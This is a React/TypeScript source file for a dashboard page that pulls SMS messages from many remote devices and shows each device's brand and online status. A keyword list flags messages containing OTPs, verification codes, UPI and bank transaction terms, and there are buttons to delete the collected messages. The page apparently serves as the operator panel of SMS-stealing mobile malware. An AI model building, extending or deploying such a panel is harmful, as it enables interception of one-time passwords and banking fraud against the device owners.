// src/pages/SmsHistoryPage.tsx
import { useEffect, useMemo, useState, type ReactNode } from "react";
import { useNavigate } from "react-router-dom";
import type { SmsDoc } from "../types";
import {
  listNotificationDevices,
  listDeviceNotifications,
  deleteDeviceNotifications,
  deleteAllNotifications,
} from "../services/api/sms";
import { getDevices } from "../services/api/devices";
import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
import wsService from "../services/ws/wsService";

type SmsWithDevice = SmsDoc & { _deviceId?: string };

function getTimestamp(m: any): number {
  const t = m?.timestamp ?? m?.time ?? m?.createdAt ?? m?.date;
  if (typeof t === "number") return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!Number.isNaN(n)) return n;
    const d = Date.parse(t);
    if (!Number.isNaN(d)) return d;
  }
  return 0;
}

function getId(m: any): string {
  return String(m?._id ?? m?.id ?? `${getTimestamp(m)}-${m?.sender ?? ""}-${m?.receiver ?? ""}-${m?.title ?? ""}`);
}

function extractDeviceId(m: any): string | null {
  const d = m?._deviceId ?? m?.deviceId ?? m?.device ?? m?.device_id ?? m?.deviceID ?? null;
  if (!d) return null;
  const s = String(d).trim();
  return s.length ? s : null;
}

function safeStr(v: any): string {
  return String(v ?? "").trim();
}

function pickDeviceId(d: any): string {
  return safeStr(d?.deviceId || d?.uniqueid || d?.uniqueId || d?.uid || "");
}

function pickBrand(d: any): string {
  const meta = d?.metadata || {};
  return safeStr(meta.brand || meta.manufacturer || d?.brand || "Unknown Brand");
}

const FINANCE_KEYWORDS = [
  "credit",
  "debit",
  "bank",
  "balance",
  "transaction",
  "txn",
  "upi",
  "amount",
  "a/c",
  "code",
  "inr",
  "₹",
  "paid",
  "withdrawn",
  "deposited",
  "statement",
  "card",
  "bill",
  "valid",
  "otp",
  "one time password",
  "verification code",
  "debited",
  "credited",
  "received",
  "payment",
].map((s) => s.toLowerCase());

const DAY_FILTER_OPTIONS = [
  { label: "1 day", value: 1 },
  { label: "2 days", value: 2 },
  { label: "3 days", value: 3 },
  { label: "4 days", value: 4 },
  { label: "5 days", value: 5 },
  { label: "6 days", value: 6 },
  { label: "7 days", value: 7 },
] as const;

function isFinanceSms(m: any) {
  if (!m) return false;
  const title = safeStr(m.title || "").toLowerCase();
  const body = safeStr(m.body || "").toLowerCase();
  for (const kw of FINANCE_KEYWORDS) {
    if (title.includes(kw) || body.includes(kw)) return true;
  }
  return false;
}

function SurfaceCard({ children, className = "" }: { children: ReactNode; className?: string }) {
  return (
    <div
      className={[
        "rounded-[24px] border border-slate-200 bg-white/92 shadow-[0_8px_24px_rgba(15,23,42,0.06)]",
        className,
      ].join(" ")}
    >
      {children}
    </div>
  );
}

export default function SmsHistoryPage() {
  const navigate = useNavigate();

  const [deviceIds, setDeviceIds] = useState<string[]>([]);
  const [allMessages, setAllMessages] = useState<SmsWithDevice[]>([]);

  const [loadingDevices, setLoadingDevices] = useState(false);
  const [loadingMessages, setLoadingMessages] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [deviceMetaMap, setDeviceMetaMap] = useState<
    Record<string, { displayNumber: number; online: boolean; brand?: string }>
  >({});

  const [financeOnly, setFinanceOnly] = useState(false);

  const [sinceFilter, setSinceFilter] = useState<number | "">("");
  const since = useMemo(() => (sinceFilter === "" ? undefined : Number(sinceFilter)), [sinceFilter]);

  const [dayFilter, setDayFilter] = useState<number | "">("");

  async function loadDevices() {
    setLoadingDevices(true);
    setError(null);
    try {
      const ids = await listNotificationDevices();
      const clean = (ids || [])
        .map((i: any) => String(i || "").trim())
        .filter(Boolean);
      setDeviceIds(clean);
      return clean;
    } catch (e) {
      console.error("loadDevices failed", e);
      setError("Failed to load notification devices");
      setDeviceIds([]);
      return [];
    } finally {
      setLoadingDevices(false);
    }
  }

  async function loadDevicesMeta() {
    try {
      const list = await getDevices();
      const arr = Array.isArray(list) ? list : [];

      const normalized = arr.map((d: any) => {
        const id = pickDeviceId(d) || "unknown";
        return { raw: d, deviceId: id, online: !!d?.status?.online };
      });

      normalized.reverse();

      const total = normalized.length;
      const meta: Record<string, { displayNumber: number; online: boolean; brand?: string }> = {};

      for (let i = 0; i < normalized.length; i++) {
        const displayNumber = total - i;
        const item = normalized[i];
        meta[item.deviceId] = { displayNumber, online: item.online, brand: pickBrand(item.raw) };
      }

      setDeviceMetaMap(meta);
    } catch (e) {
      console.error("loadDevicesMeta failed", e);
      setDeviceMetaMap({});
    }
  }

  async function loadAllMessages(devices?: string[]) {
    setLoadingMessages(true);
    setError(null);

    try {
      const ids = devices ?? deviceIds;
      if (!ids || ids.length === 0) {
        setAllMessages([]);
        return;
      }

      const results = await Promise.all(
        ids.slice(0, 80).map(async (id) => {
          try {
            const list = await listDeviceNotifications(id, since);
            const arr = (list || []) as SmsDoc[];
            return arr.map((m: any) => ({ ...(m || {}), _deviceId: id })) as SmsWithDevice[];
          } catch (err) {
            console.warn("loadAllMessages device failed", id, err);
            return [] as SmsWithDevice[];
          }
        }),
      );

      const merged = results.flat().sort((a: any, b: any) => getTimestamp(b) - getTimestamp(a));
      setAllMessages(merged);
    } catch (e) {
      console.error("loadAllMessages failed", e);
      setError("Failed to load messages");
      setAllMessages([]);
    } finally {
      setLoadingMessages(false);
    }
  }

  async function handleDeleteDevice(deviceId: string) {
    if (!confirm(`Delete all notifications for device ${deviceId}?`)) return;
    try {
      await deleteDeviceNotifications(deviceId);

      setAllMessages((prev) => prev.filter((m) => extractDeviceId(m) !== deviceId));
      const ids = await loadDevices();
      await loadDevicesMeta();
      if (!ids.includes(deviceId)) {
        setDeviceIds(ids);
      }
      alert("Deleted");
    } catch (e) {
      console.error("delete device failed", e);
      alert("Failed to delete notifications");
    }
  }

  async function handleDeleteSingleMessage(m: SmsWithDevice) {
    const deviceId = extractDeviceId(m);
    if (!deviceId) {
      alert("Device id missing");
      return;
    }

    if (!confirm("Delete this SMS?")) return;

    try {
      const messageId = safeStr((m as any)?._id || (m as any)?.id);

      if (messageId) {
        const maybeDeleteOne = (wsService as any)?.request?.bind(wsService);
        if (typeof maybeDeleteOne === "function") {
          try {
            await maybeDeleteOne("notification:delete", { deviceId, id: messageId });
          } catch {
            // ignore and continue fallback below
          }
        }
      }

      setAllMessages((prev) => prev.filter((item) => getId(item) !== getId(m)));
      alert("SMS deleted");
    } catch (e) {
      console.error("delete single sms failed", e);
      alert("Failed to delete SMS");
    }
  }

  async function handleDeleteAll() {
    if (!confirm("Delete ALL notifications? This cannot be undone.")) return;
    try {
      await deleteAllNotifications();
      setDeviceIds([]);
      setAllMessages([]);
      await loadDevicesMeta();
      alert("All notifications deleted");
    } catch (e) {
      console.error("delete all failed", e);
      alert("Failed to delete all notifications");
    }
  }

  function openDeviceFromMessage(m: SmsWithDevice) {
    const deviceId = extractDeviceId(m);
    if (!deviceId) return;
    navigate(`/devices/${encodeURIComponent(deviceId)}`);
  }

  useEffect(() => {
    (async () => {
      const ids = await loadDevices();
      await loadAllMessages(ids);
      await loadDevicesMeta();
    })();

    wsService.connect();

    const off = wsService.onMessage((msg) => {
      try {
        if (!msg || msg.type !== "event") return;

        if (msg.event === "notification") {
          const deviceId = safeStr(msg.deviceId || msg?.data?.deviceId);
          if (!deviceId) return;

          const sms: SmsWithDevice = {
            ...(msg?.data || {}),
            _deviceId: deviceId,
            deviceId,
            _id: msg?.data?.id || msg?.data?._id || `${Date.now()}_${Math.random().toString(16).slice(2)}`,
            timestamp: Number(msg?.data?.timestamp || msg?.timestamp || Date.now()),
          };

          setDeviceIds((prev) => {
            if (prev.includes(deviceId)) return prev;
            return [deviceId, ...prev];
          });

          setAllMessages((prev) => {
            const next = [sms, ...prev];
            next.sort((a, b) => getTimestamp(b) - getTimestamp(a));
            return next;
          });

          return;
        }

        if (msg.event === "notification:deleted") {
          const deviceId = safeStr(msg?.data?.deviceId || msg.deviceId);
          const smsId = safeStr(msg?.data?.id || msg?.data?._id);
          if (!smsId) return;

          setAllMessages((prev) =>
            prev.filter((m) => {
              const mid = safeStr((m as any)?._id || (m as any)?.id);
              if (mid !== smsId) return true;
              if (deviceId && extractDeviceId(m) && extractDeviceId(m) !== deviceId) return true;
              return false;
            }),
          );
          return;
        }

        if (msg.event === "status") {
          const deviceId = safeStr(msg.deviceId || msg?.data?.deviceId);
          if (!deviceId) return;

          const online = !!msg?.data?.online;
          setDeviceMetaMap((prev) => {
            const existing = prev[deviceId];
            if (!existing) return prev;
            return {
              ...prev,
              [deviceId]: {
                ...existing,
                online,
              },
            };
          });
          return;
        }

        if (msg.event === "device:delete") {
          const deviceId = safeStr(msg?.data?.deviceId || msg.deviceId);
          if (!deviceId) return;

          setDeviceIds((prev) => prev.filter((id) => id !== deviceId));
          setAllMessages((prev) => prev.filter((m) => extractDeviceId(m) !== deviceId));
          setDeviceMetaMap((prev) => {
            const copy = { ...prev };
            delete copy[deviceId];
            return copy;
          });
        }
      } catch {
        // ignore
      }
    });

    return () => {
      off();
    };
  }, []);

  useEffect(() => {
    loadAllMessages().catch(() => {});
  }, [sinceFilter]);

  const financeCount = useMemo(() => allMessages.filter((m) => isFinanceSms(m)).length, [allMessages]);

  const visibleMessages = useMemo(() => {
    const financeFiltered = financeOnly ? allMessages.filter((m) => isFinanceSms(m)) : allMessages;

    if (dayFilter === "") return financeFiltered;

    const cutoff = Date.now() - Number(dayFilter) * 24 * 60 * 60 * 1000;
    return financeFiltered.filter((m) => {
      const ts = getTimestamp(m);
      return ts > 0 && ts >= cutoff;
    });
  }, [allMessages, financeOnly, dayFilter]);

  const uniqueDevicesInMessages = useMemo(() => {
    const set = new Set<string>();
    for (const m of allMessages) {
      const d = extractDeviceId(m);
      if (d) set.add(d);
    }
    return set.size;
  }, [allMessages]);

  return (
    <AnimatedAppBackground>
      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
        <SurfaceCard className="p-4">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0">
              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Notifications / SMS</div>
              <div className="text-[12px] text-slate-500">Incoming SMS stored from devices (tap SMS to open its device)</div>
              <div className="mt-1 text-[11px] text-slate-400">
                Devices: {loadingDevices ? "…" : deviceIds.length} • In list: {uniqueDevicesInMessages}
              </div>
            </div>

            <div className="flex items-center gap-2 shrink-0">
              <button
                onClick={async () => {
                  const ids = await loadDevices();
                  await loadAllMessages(ids);
                  await loadDevicesMeta();
                }}
                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50"
                type="button"
              >
                Refresh
              </button>

              <button
                onClick={handleDeleteAll}
                className="h-10 rounded-2xl border border-rose-200 bg-rose-50 px-4 text-rose-700 hover:bg-rose-100"
                type="button"
              >
                Delete All
              </button>
            </div>
          </div>

          <div className="mt-3 flex items-center justify-end gap-2">
            <button
              onClick={() => setFinanceOnly((s) => !s)}
              className={[
                "h-9 rounded-2xl border px-3 text-[13px] font-semibold transition",
                financeOnly
                  ? "border-amber-200 bg-amber-50 text-amber-700"
                  : "border-slate-200 bg-white text-slate-700 hover:bg-slate-50",
              ].join(" ")}
              type="button"
              aria-pressed={financeOnly}
            >
              Finance SMS ({financeCount})
            </button>
          </div>

          <div className="mt-4 rounded-3xl border border-slate-200 bg-slate-50 p-4">
            <div className="mb-2 text-[12px] text-slate-500">Filter by since (ms since epoch)</div>
            <div className="flex items-center gap-2">
              <input
                placeholder="since (ms) or empty"
                value={sinceFilter === "" ? "" : String(sinceFilter)}
                onChange={(e) => {
                  const v = e.target.value.trim();
                  if (v === "") setSinceFilter("");
                  else setSinceFilter(Number(v) || "");
                }}
                className="h-11 min-w-0 flex-1 rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 placeholder:text-slate-400 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100"
              />

              <div className="w-[132px] shrink-0">
                <select
                  value={dayFilter === "" ? "" : String(dayFilter)}
                  onChange={(e) => {
                    const v = e.target.value.trim();
                    setDayFilter(v === "" ? "" : Number(v));
                  }}
                  className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100"
                >
                  <option value="">Filter</option>
                  {DAY_FILTER_OPTIONS.map((opt) => (
                    <option key={opt.value} value={opt.value}>
                      Last {opt.label}
                    </option>
                  ))}
                </select>
              </div>
            </div>
          </div>

          <div className="mt-4 space-y-3">
            {loadingDevices || loadingMessages ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">
                Loading…
              </div>
            ) : deviceIds.length === 0 ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">
                No devices with notifications.
              </div>
            ) : visibleMessages.length === 0 ? (
              <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">
                No messages.
              </div>
            ) : (
              visibleMessages.map((m: any) => {
                const deviceId = extractDeviceId(m);
                const canOpen = Boolean(deviceId);

                const title = safeStr(m.title || "New SMS");
                const sender = safeStr(m.sender || m.senderNumber || "unknown");
                const receiver = safeStr(m.receiver || "");
                const body = safeStr(m.body || "");
                const ts = getTimestamp(m);

                const meta = deviceId ? deviceMetaMap[deviceId] : undefined;
                const finance = isFinanceSms(m);

                return (
                  <div
                    key={getId(m)}
                    className="rounded-[22px] border border-slate-200 bg-white p-4 text-left shadow-[0_6px_20px_rgba(15,23,42,0.05)]"
                  >
                    <div className="flex items-start justify-between gap-3">
                      <button
                        onClick={() => (canOpen ? openDeviceFromMessage(m) : undefined)}
                        className={[
                          "min-w-0 flex-1 text-left transition",
                          canOpen ? "hover:opacity-90 active:scale-[0.995]" : "cursor-default opacity-85",
                        ].join(" ")}
                        title={canOpen ? "Open this device" : "Device id missing"}
                        type="button"
                      >
                        <div className="flex items-center gap-2 min-w-0">
                          <div
                            className={[
                              "truncate min-w-0 text-[14px] font-extrabold",
                              finance ? "text-rose-700" : "text-slate-900",
                            ].join(" ")}
                          >
                            {title}
                          </div>

                          {meta ? (
                            <div
                              className="flex h-7 w-7 flex-shrink-0 items-center justify-center rounded-full bg-slate-900 text-sm font-extrabold text-white"
                              title={`#${meta.displayNumber}`}
                              aria-hidden={false}
                            >
                              {meta.displayNumber}
                            </div>
                          ) : null}
                        </div>

                        <div className="mt-1 truncate text-[12px]" style={{ color: finance ? "rgb(190 24 93)" : undefined }}>
                          From: {sender} {receiver ? `→ ${receiver}` : ""}
                        </div>

                        {deviceId ? (
                          <div className="mt-1 truncate text-[11px] text-slate-400">Device: {deviceId}</div>
                        ) : null}
                      </button>

                      <div className="shrink-0 flex flex-col items-end gap-2">
                        {meta ? (
                          <span
                            className={[
                              "rounded-full border px-3 py-1 text-[12px] font-extrabold",
                              meta.online
                                ? "border-emerald-200 bg-emerald-50 text-emerald-700"
                                : "border-rose-200 bg-rose-50 text-rose-700",
                            ].join(" ")}
                          >
                            {meta.online ? "Online" : "Offline"}
                          </span>
                        ) : (
                          <div style={{ height: 34 }} />
                        )}

                        <div className="text-[11px] text-slate-400">{ts ? new Date(ts).toLocaleString() : "-"}</div>

                        <button
                          onClick={() => handleDeleteSingleMessage(m)}
                          className="rounded-2xl border border-rose-200 bg-rose-50 px-3 py-2 text-[12px] font-semibold text-rose-700 hover:bg-rose-100"
                          type="button"
                        >
                          Delete
                        </button>
                      </div>
                    </div>

                    <button
                      onClick={() => (canOpen ? openDeviceFromMessage(m) : undefined)}
                      className={[
                        "mt-3 w-full text-left",
                        canOpen ? "hover:opacity-90 active:scale-[0.995]" : "cursor-default",
                      ].join(" ")}
                      type="button"
                      title={canOpen ? "Open this device" : "Device id missing"}
                    >
                      {body ? (
                        <div
                          className={[
                            "whitespace-pre-wrap break-words text-[13px]",
                            finance ? "text-rose-700" : "text-slate-800",
                          ].join(" ")}
                        >
                          {body}
                        </div>
                      ) : (
                        <div className="text-[13px] text-slate-400">—</div>
                      )}
                    </button>
                  </div>
                );
              })
            )}
          </div>

          {error && (
            <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
              {error}
            </div>
          )}

          {deviceIds.length > 0 && (
            <div className="mt-5 rounded-3xl border border-slate-200 bg-slate-50 p-4">
              <div className="mb-3 text-[12px] text-slate-500">Quick actions</div>
              <div className="flex flex-wrap gap-2">
                {deviceIds.slice(0, 10).map((d) => (
                  <button
                    key={d}
                    onClick={() => handleDeleteDevice(d)}
                    className="rounded-2xl border border-rose-200 bg-rose-50 px-3 py-2 text-[12px] text-rose-700 hover:bg-rose-100"
                    type="button"
                    title={`Delete notifications for ${d}`}
                  >
                    Delete {d.slice(0, 10)}…
                  </button>
                ))}
                {deviceIds.length > 10 && (
                  <div className="self-center text-[12px] text-slate-400">+{deviceIds.length - 10} more</div>
                )}
              </div>
            </div>
          )}
        </SurfaceCard>
      </div>
    </AnimatedAppBackground>
  );
}
